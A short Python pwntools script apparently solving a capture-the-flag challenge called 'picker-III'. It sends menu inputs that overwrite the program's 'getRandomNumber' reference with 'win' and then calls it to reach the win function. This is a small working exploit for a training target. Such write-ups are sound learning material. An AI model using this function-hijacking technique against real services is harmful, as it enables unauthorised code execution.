#!/usr/bin/env python3
from pwn import *

p = process(['python3', 'picker-III.py'])
# p = remote('', )

# create getRandomNumber variable coincide with getRandomNumber function
p.sendlineafter(b'==> ', b'2')
p.sendlineafter(b': ', str('getRandomNumber').encode())

# assign variable win to variable getRandomNumber
p.sendlineafter(b'==> ', b'3')
p.sendlineafter(b': ', str('getRandomNumber').encode())
p.sendlineafter(b': ', str('win').encode())

#call getRandomNumber func now is win func
p.sendlineafter(b'==> ', b'4')

p.interactive()